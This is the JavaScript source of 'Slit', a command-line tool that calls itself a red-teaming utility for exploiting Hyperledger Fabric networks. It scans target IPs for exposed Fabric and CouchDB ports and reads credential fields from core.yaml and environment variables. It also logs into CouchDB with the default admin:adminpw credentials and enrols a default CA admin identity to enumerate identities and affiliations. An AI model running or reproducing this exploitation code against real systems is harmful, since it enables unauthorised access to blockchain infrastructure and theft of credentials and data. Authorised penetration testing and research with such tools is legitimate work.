var fs = require('fs');
var path = require('path');
const colors = require('colors');
const inquirer = require('inquirer');
var walk = require('walk');
const FabricCAServices = require('fabric-ca-client');
const yaml = require('js-yaml');
const {
  Wallets
} = require('fabric-network');
const Evilscan = require('evilscan');
const curl = new(require('curl-request'))();
const commander = require('commander');

// ipprompt() => function input prompt is to display Slit modules to user and accept inputs
function ipprompt() {
  inquirer
    .prompt([{
      type: 'list',
      name: 'Options',
      message: 'Select a module from below list'.brightYellow,
      choices: ['Enumerate for exposed HLF nodes', 'Enumerate for HLF environment variables', 'Enumerate for exposed CouchDB endpoints', 'Enumerate for Connection Profiles', 'Attempt connecting to CA server', 'Attempt enrolling default admin user to CA server', 'Exit'.brightYellow],
    }, ])
    .then(answers => {
      if (answers.Options == "Exit") {
        process.exit()
      } else if (answers.Options == "Enumerate for exposed HLF nodes") {
        inquirer
          .prompt([{
            name: 'ipadres',
            message: 'Enter target IP address: '
          }, ])
          .then(answers => {
            if (answers.ipadres) {
              opsenum(answers.ipadres)
            } else {
              console.log('Invalid IP address received'.brightMagenta)
              DYC();
            }
          });
      } else if (answers.Options == "Enumerate for HLF environment variables") {
        searchenv();
      } else if (answers.Options == "Enumerate for exposed CouchDB endpoints") {
        enumcouchdb()
      } else if (answers.Options == "Enumerate for Connection Profiles") {
        inquirer
          .prompt([{
            name: 'dpath',
            message: 'Enter target directory path for enumeration (Default value is path to current working directoty): '
          }, ])
          .then(answers => {
            if (answers.dpath) {
              filewalk(answers.dpath);
            } else {
              filewalk(__dirname);
            }
          });
      } else if (answers.Options == "Attempt connecting to CA server") {
        inquirer
          .prompt([{
            name: 'pathcp',
            message: 'Enter path to Connection Profile: ',
          }, ])
          .then(answers => {
            if (answers.pathcp) {
              caconnect(answers.pathcp)
                .then(res => {
                  if (res == "Error") {
                    console.log("Connection attempt failed".brightMagenta)
                    DYC();
                  } else {
                    console.log("Sucessfully connected to CA Server".brightGreen)
                    DYC();
                  }
                });
            } else {
              console.log('Invalid path received'.brightMagenta)
              DYC();
            }
          });
      } else if (answers.Options == "Attempt enrolling default admin user to CA server") {
        inquirer
          .prompt([{
              name: 'pathcp',
              message: 'Enter path to Connection Profile: ',
            },
            {
              name: 'mspval',
              message: 'Enter mspvalue',
              //default: '#008f68'
            },
          ])
          .then(answers => {
            if (answers.pathcp && answers.mspval) {
              caconnect(answers.pathcp)
                .then(res => {
                  if (res == "Error") {
                    console.log("Connection attempt failed".brightMagenta)
                    DYC();
                  } else {
                    console.log("Sucessfully connected to CA Server".brightGreen)
                    enrollAdmin(res, answers.mspval);
                    //DYC();
                  }
                });
            } else {
              console.log('Invalid CP path || mspID received'.brightMagenta)
              DYC();
            }
          });

      } else {
        console.info('Thanks for using Slit, bye for now :)');
      }
    });
}

// opsenum() => function operation service enumeration is to identify HLF nodes such as peers / oderers who expose operation service endpoint
function opsenum(ip) {
  var cpvalues = [];
  let ipregex = new RegExp(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/);
  let val = ipregex.test(ip)
  if (val) {
    const options = {
      target: ip,
      //target:'172.18.0.9-172.18.0.8',
      port: '9050-9055, 9440-9446',
      status: 'TROU', // Timeout, Refused, Open, Unreachable
      timeout: 3000,
      banner: true,
      //geo:true
    };
    const evilscan = new Evilscan(options);
    evilscan.on('result', (data) => {
      if (data.status == "open") {
        cpvalues.push({
          'targetip': data.ip,
          'openport': data.port
        });
      }
    });
    evilscan.on('error', (err) => {
      throw err;
    });
    evilscan.on('done', () => {
      console.log("List of open ports observed")
      console.table(cpvalues);
      cpvalues.forEach(element => {
        var URL = "http://" + element.targetip + ":" + element.openport + "/version"
        curl.setHeaders([
            'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'
          ])
          .get(URL)
          .then(({
            statusCode,
            body,
            headers
          }) => {
            if (statusCode == 200) {
              console.log("Potential HLF service detected at " + element.targetip + ":" + element.openport)
              console.log(body);
            }
            //console.log(statusCode, body, headers)
          })
          .catch((e) => {
            console.log("No potential HLF services were observed at " + element.targetip + ":" + element.openport);
          });
      });
    });
    evilscan.run();
  } else {
    console.log('Invalid IP address received'.brightMagenta)
    DYC();
  }
}

// searchenv() => function search environment variables is to identify HLF env variables
function searchenv() {
  let Senvvar = ['PEER', 'ORDERER', 'FABRIC_CFG_PATH', 'CA', 'FABRIC'];
  var envvalues = [];
  console.log('List of enumerated env variables')
  var env = process.env;
  Object.keys(env).forEach(function(key) {
    const foundevar = Senvvar.find(v => key.includes(v));
    if (typeof foundevar !== "undefined") {
      envvalues.push({
        'Environment Variable': key,
        'Value': env[key]
      });
    }
  });
  if (envvalues.length === 0) {
    console.log("No HLF environment variables were observed".brightMagenta)
  } else {
    console.table(envvalues);
  }
  DYC();
}

// enumcouchdb() => function Enumerate CouchDB is to identify exposed CouchDB endpoints of HLF nodes
function enumcouchdb() {
  let Senvvar = ['FABRIC_CFG_PATH'];
  var envvalues = [];
  console.log('Enumerating for FABRIC_CFG_PATH env variable')
  let kwords = ['couchDBAddress:', 'stateDatabase:', 'username:', 'password:']
  var coreylvalues = [];
  var env = process.env;
  Object.keys(env).forEach(function(key) {
    const foundevar = Senvvar.find(v => key.includes(v));
    if (typeof foundevar !== "undefined") {
      envvalues.push({
        'Environment Variable': key,
        'Value': env[key]
      });
    }
  });
  if (envvalues.length === 0) {
    console.log("No FABRIC_CFG_PATH env variable was observed in system".brightMagenta)
    inquirer
      .prompt([{
        name: 'ipadres',
        message: 'Enter target IP address: '
      }, ])
      .then(answers => {
        if (answers.ipadres) {
          couchdbIP(answers.ipadres)
        } else {
          console.log('Invalid IP address received'.brightMagenta)
          DYC();
        }
      });
  } else {
    console.table(envvalues);
    var count = 0;
    var walker = walk.walk(envvalues[0].Value, {
      followLinks: false
    });
    walker.on('file', function(root, stat, next) {
      if (stat.name === 'core.yaml') {
        console.log('File found at ' + root + '/' + stat.name)
        count = count + 1;
        let file = root + "/" + stat.name;
        let Rfile = fs.readFileSync(file, "utf8");
        let arr = Rfile.split(/\r?\n/);
        arr.forEach((line, idx) => {
          const found = kwords.find(v => line.includes(v));
          if (typeof found !== "undefined") {
            coreylvalues.push({
              'Parameter_Name': found,
              'Parameter_Value': line.replace(found, '')
            });
          }
        });
      }
      next();
    });
    walker.on("end", function() {
      if (count === 0) {
        console.log('No potential Core.yaml files were observed at FABRIC_CFG_PATH'.brightMagenta, dirpath)
        inquirer
          .prompt([{
            name: 'ipadres',
            message: 'Enter target IP address: '
          }, ])
          .then(answers => {
            if (answers.ipadres) {
              couchdbIP(answers.ipadres)
            } else {
              console.log('Invalid IP address received'.brightMagenta)
              DYC();
            }
          });
      } else if ((envvalues.length === 1) && (coreylvalues.length != 0)) {
        console.log("Enumerating core.yaml")
        console.table(coreylvalues);
        const IP = coreylvalues[1].Parameter_Value.split(":").map(item => item.trim());
        couchdbIP(IP[0], IP[1]);
      }
      //DYC();
    });
  }
}

// couchdbIP() => function CouchDB IP is to connect with exposed CouchDB instance
function couchdbIP(tip, tport) {
  if (tip != null && tport == null) {
    var cpvalues = [];
    let ipregex = new RegExp(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/);
    let val = ipregex.test(tip)
    if (val) {
      const options = {
        target: tip,
        //target:'172.18.0.9-172.18.0.8',
        port: '5980-5985',
        status: 'TROU', // Timeout, Refused, Open, Unreachable
        timeout: 3000,
        banner: true,
        //geo:true
      };
      const evilscan = new Evilscan(options);
      evilscan.on('result', (data) => {
        if (data.status == "open") {
          cpvalues.push({
            'targetip': data.ip,
            'openport': data.port
          });
        }
      });
      evilscan.on('error', (err) => {
        throw err;
      });
      evilscan.on('done', () => {
        console.log("List of open ports observed")
        console.table(cpvalues);
        cpvalues.forEach(element => {
          var URL = "http://admin:adminpw@" + element.targetip + ":" + element.openport + "/_all_dbs"
          curl.setHeaders([
              'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'
            ])
            .get(URL)
            .then(({
              statusCode,
              body,
              headers
            }) => {
              if (statusCode == 200) {
                console.log("Vulnerable CouchDB endpoint observed at " + element.targetip + ":" + element.openport)
                console.log("Enumerating DB's with default credentials : " + "http://admin:adminpw@" + element.targetip + ":" + element.openport + "/_all_dbs")
                console.log(body);
              }
              //console.log(statusCode, body, headers)
            })
            .catch((e) => {
              console.log("Could not observe vulnerable Couch DB endpoint at " + element.targetip + ":" + element.openport);
            });
        });
      });
      evilscan.run();
    } else {
      console.log('Invalid IP address received'.brightMagenta)
      DYC();
    } //closing of (tip != null && tport == null)
  } else if (tip != null && tport != null) {
    var URL = "http://admin:adminpw@" + tip + ":" + tport + "/_all_dbs"
    curl.setHeaders([
        'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'
      ])
      .get(URL)
      .then(({
        statusCode,
        body,
        headers
      }) => {
        if (statusCode == 200) {
          console.log("Vulnerable CouchDB endpoint observed at " + tip + ":" + tport)
          console.log("Enumerating DB's with default credentials : " + "http://admin:adminpw@" + tip + ":" + tport + "/_all_dbs")
          console.log(body);
        }
        //console.log(statusCode, body, headers)
      })
      .catch((e) => {
        console.log("Could not observe vulnerable Couch DB endpoint at " + tip + ":" + element.tport);
      });
  } else {
    console.log('Error Courred');
    DYC();
  }
} //closing of couchdbIP(tip,tport)

// filewalk() function file walk is to Enumerate files for connection profile for HLF network
function filewalk(dirpath) {
  var cpvalues = [];
  let regex = new RegExp(/Connection.*\.[jy][as][mo][nl]$/, "i");
  var count = 0;
  var walker = walk.walk(dirpath, {
    followLinks: false
  });
  walker.on('file', function(root, stat, next) {
    let val = regex.test(stat.name)
    if (val) {
      cpvalues.push({
        'Path to file': root,
        'File name': stat.name
      });
      count = count + 1;
    }
    next();
  });
  walker.on("end", function() {
    if (count === 0) {
      console.log('No potential Connection Profiles were observed at '.brightMagenta, dirpath)
    } else {
      console.table(cpvalues);
    }
    DYC();
  }); //walker end
} // func filewalk end

//caconnect(x) => function ca connect is to establish a sucessfull connection with CA server in HLF network
function caconnect(x) {
  return new Promise((sucess) => {
    try {
      let connectionProfile = yaml.safeLoad(fs.readFileSync(x, 'utf8'));
      // Create a new CA client for interacting with the CA.
      const caInfo = connectionProfile.certificateAuthorities[Object.keys(connectionProfile.certificateAuthorities)[0]];
      const caTLSCACerts = caInfo.tlsCACerts.pem;
      const ca = new FabricCAServices(caInfo.url, {
        trustedRoots: caTLSCACerts,
        verify: false
      }, caInfo.caName);
      sucess(ca);
    } catch (error) {
      sucess('Error');
    }
  });
}

// enrollAdmin() => function enroll admin is to exploit CA server if default admin is supported
async function enrollAdmin(caval, mspid) {
  try {
    const walletPath = path.join(process.cwd(), 'wallet');
    const wallet = await Wallets.newFileSystemWallet(walletPath);
    const enrollment = await caval.enroll({
      enrollmentID: 'admin',
      enrollmentSecret: 'adminpw'
    });
    const x509Identity = {
      credentials: {
        certificate: enrollment.certificate,
        privateKey: enrollment.key.toBytes(),
      },
      mspId: mspid,
      type: 'X.509',
    };
    await wallet.put('admin', x509Identity);
    //console.log('Successfully enrolled admin user "admin" and imported it into the wallet');
    const adminIdentity = await wallet.get('admin');
    if (!adminIdentity) {
      console.log('Unsucessfull admin enroll'.brightMagenta);
    } else {
      console.log('Successfully enrolled admin user "admin" and imported it into the wallet'.brightGreen);
      const provider = wallet.getProviderRegistry().getProvider(adminIdentity.type);
      const adminUser = await provider.getUserContext(adminIdentity, 'admin');
      inquirer
        .prompt([{
          type: 'list',
          name: 'adminOptions',
          message: 'Select a module from below list'.brightYellow,
          choices: ['Enumerate identities', 'Enumerate affiliations'],
        }, ])
        .then(answers => {
          if (answers.adminOptions == "Enumerate affiliations") {
            let affiliationService = caval.newAffiliationService();
            //let registeredAffiliations = affiliationService.getAll(adminUser);
            affiliationService.getAll(adminUser)
              .then(registeredAffiliations => {
                console.dir(registeredAffiliations, {
                  depth: null
                })
              });
            DYC();
          } else if (answers.adminOptions == "Enumerate identities") {
            let identityService = caval.newIdentityService();
            identityService.getAll(adminUser)
              .then(registeredidentities => {
                console.dir(registeredidentities, {
                  depth: null
                })
              });
            //let registeredidentities = identityService.getAll(adminUser);
            DYC();
          } else {
            console.log('Invalid value received'.brightMagenta)
            DYC();
          }
        });
    }
  } catch (error) {
    console.error(`Failed & Error ${error}`);
    DYC();
  }
}

// DYC() => function Do You want to Continue is to ask user if they want to proceed with execution of Slit
function DYC() {
  inquirer
    .prompt([{
      type: 'list',
      name: 'DYCOptions',
      message: 'Do you wish to continue with Slit?'.brightYellow,
      choices: ['Yes', 'No'],
    }, ])
    .then(answers => {
      if (answers.DYCOptions == "No") {
        process.exit()
      } else if (answers.DYCOptions == "Yes") {
        ipprompt();
      } else {
        console.info('Answer:', answers.DYCOptions);
      }
    });
}

// main() => main function
function main() {
  console.log(" ")
  console.log("  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2593     \u2588\u2588\u2593\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593\r\n\u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2592    \u2593\u2588\u2588\u2592\u2593  \u2588\u2588\u2592 \u2593\u2592\r\n\u2591 \u2593\u2588\u2588\u2584   \u2592\u2588\u2588\u2591    \u2592\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2591 \u2592\u2591\r\n  \u2592   \u2588\u2588\u2592\u2592\u2588\u2588\u2591    \u2591\u2588\u2588\u2591\u2591 \u2593\u2588\u2588\u2593 \u2591 \r\n\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2591\u2588\u2588\u2591  \u2592\u2588\u2588\u2592 \u2591 \r\n\u2592 \u2592\u2593\u2592 \u2592 \u2591\u2591 \u2592\u2591\u2593  \u2591\u2591\u2593    \u2592 \u2591\u2591   \r\n\u2591 \u2591\u2592  \u2591 \u2591\u2591 \u2591 \u2592  \u2591 \u2592 \u2591    \u2591    \r\n\u2591  \u2591  \u2591    \u2591 \u2591    \u2592 \u2591  \u2591      \r\n      \u2591      \u2591  \u2591 \u2591           \r\n                              ")
  commander
    .version('Version: 1.0', '-v, --version', 'Output the version number'.brightCyan)
    .name("node slit.js")
    .usage('[OPTIONS]...')
    .option('-d, --description', 'Get to know Slit'.brightCyan)
    .option('-l, --list', 'List modules in Slit'.brightCyan)
    //.option('-h, --help', 'List options')
    .helpOption('-h, --HELP', 'Display HELP information'.brightCyan)
    .option('-r, --run', 'Run Slit'.brightCyan)
    .parse(process.argv);
  const options = commander.opts();
  if (options.description) {
    console.log('Description:')
    console.log("\"Slit\" is an interactive CLI built-in node js which serves as an \"Interface\", \n\"Enumeration\", and \"Dissecting\" tool for exploiting Hyperledger Fabric. \n\"Slit\" is intended to be used as a red teaming tool at the infrastructure\nlayer.\"Slit\" is designed with the primary aim to decrease the knowledge gap\nb/w a security researcher and a fabric domain expert.\n\"Slit\" had been deployed and tested against Hyperledger Fabric v 2.3.3\n".brightCyan);
    DYC();
  } else if (options.list) {
    console.log('Modules List:')
    console.log('> Enumerate for exposed Hyperledger Fabric (HLF) nodes\n\t> Enter the target IP address\n> Enumerate for HLF environment variables\n> Enumerate for exposed CouchDB endpoints\n\t> Enumerate environment variables\n\t> Enter the target IP address\n> Enumerate for Connection Profiles\n\t> Enter target directory path for enumeration (Default value is cwd)\n> Attempt connecting to CA server\n\t> Enter the path to Connection Profile\n> Attempt enrolling default admin user to CA server\n\t> Enter the path to Connection Profile\n\t> Enter MSPvalue\n\t\t> Enumerate Affiliations\n\t\t> Enumerate Identities\n'.brightCyan);
    DYC();
  } else if (options.run) {
    ipprompt();
  } else {
    ipprompt();
  }
}
if (require.main === module) {
  main();
}
